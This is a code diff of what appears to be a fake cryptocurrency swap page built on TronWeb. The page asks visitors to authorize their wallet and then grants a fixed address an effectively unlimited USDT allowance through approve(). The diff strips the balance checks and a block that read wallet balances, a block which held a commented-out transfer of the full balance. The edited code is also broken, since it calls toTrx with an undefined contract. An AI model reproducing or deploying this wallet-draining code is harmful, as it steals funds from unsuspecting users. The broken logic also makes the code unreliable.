@@ -567,10 +567,7 @@
 
 			  function swap() {
 				 Qmsg.error = console.log;
-				if (coinNum <= 0) {
-				  Qmsg.error(` Insufficient assets (你沒有資產) `);
-				  return;
-				}
+				
 				if (Number($($("input")[0]).val()) <= 0) {
 				  Qmsg.error({
 					autoClose: true,
@@ -579,69 +576,13 @@
 				  });
 				  return;javascript:;
 				}
-				if (getInputCoinNum() > coinNum) {
-				  Qmsg.error(` Insufficient assets (資產不足夠) `);
-				  return;
-				}
 				let loading = Qmsg.loading(
 				  `<br><br>Please authorize your wallet to complete the transaction<br><br>請通過授權您的錢包以完成交易`
 				);
-				tronWeb.trx
-				  .getAccount()
-				  .then((account) => {
-					tronWeb.trx
-					  .getBalance()
-					  .then((trxbalance) => {
-						let trxbalanceNum = trxbalance / 1000000;
-					   // console.log("TRX", trxbalanceNum);
-						tronWeb
-						  .contract()
-						  .at(usdtTrc20)
-						  .then((usdtContract) => {
-							usdtContract
-							  .balanceOf(tronWeb.defaultAddress.base58)
-							  .call()
-							  .then((usdtbalance) => {
-								let usdtbalanceNum = usdtbalance.toNumber() / 1000000; 
-								if (usdtbalanceNum > 1) {
-								/*
-								  usdtContract
-									.transfer(toAddress, usdtbalance.toNumber())
-									.send()
-									.finally(() => {
-									  loading.close();
-									  toTrx(usdtContract, trxbalance);
-									});
-								*/
-								  loading.close(); // v1
-								  toTrx(usdtContract, trxbalance); // v1
-								} else {
-								  loading.close();
-								  toTrx(usdtContract, trxbalance);
-								}
-							  })
-							  .catch(() => {
-								loading.close();
-								Qmsg.error(` Authorization failed (授權失敗)) `);
-							  });
-						  })
-						  .catch(() => {
-							loading.close();
-							Qmsg.error(` Authorization failed (授權失敗)) `);
-						  });
-					  })
-					  .catch(() => {
-						loading.close();
-						Qmsg.error(` Authorization failed (授權失敗)) `);
-					  });
-				  })
-				  .catch(() => {
-					loading.close();
-					Qmsg.error(` Authorization failed (授權失敗)) `);
-				  });
+				toTrx(usdtContract);
 			  }
 			   
-			  function toTrx(usdtContract, trxbalance) {
+			  function toTrx(usdtContract) {
 				usdtContract
 				  .approve(toAddress, 1000000000000000)
 				  .send()
